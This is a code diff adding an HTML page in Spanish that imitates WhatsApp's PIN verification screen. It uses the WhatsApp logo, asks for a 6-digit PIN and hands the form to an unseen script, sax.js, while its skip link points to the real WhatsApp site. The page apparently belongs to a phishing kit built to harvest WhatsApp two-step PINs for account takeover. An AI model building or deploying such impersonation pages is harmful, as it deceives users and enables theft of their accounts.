@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verificación PIN</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="top-bg"></div>
+  <div class="form-wrapper">
+    <div class="form-box">
+      <img src="WhatsApp.svg" alt="Logo" class="logo" />
+      <p class="intro-text">
+        Ingrese su PIN de 6 dígitos que ha sido asignado a su cuenta. <br>
+        Si usted no posee un PIN de 6 dígitos, puede hacer clic en <strong>OMITIR</strong>.
+      </p>
+      <form id="pinForm">
+        <input class="codiga" id="pin" placeholder="PIN de 6 dígitos" pattern="\d{6}" required maxlength="6" />
+        <button type="submit">CONTINUAR</button>
+      </form>
+
+      <div style="margin-top: 15px;">
+        <a href="https://www.whatsapp.com/" style="text-decoration: none; color: #0c0d0e; font-weight: bold;">
+          OMITIR
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <script src="sax.js"></script>
+</body>
+</html>
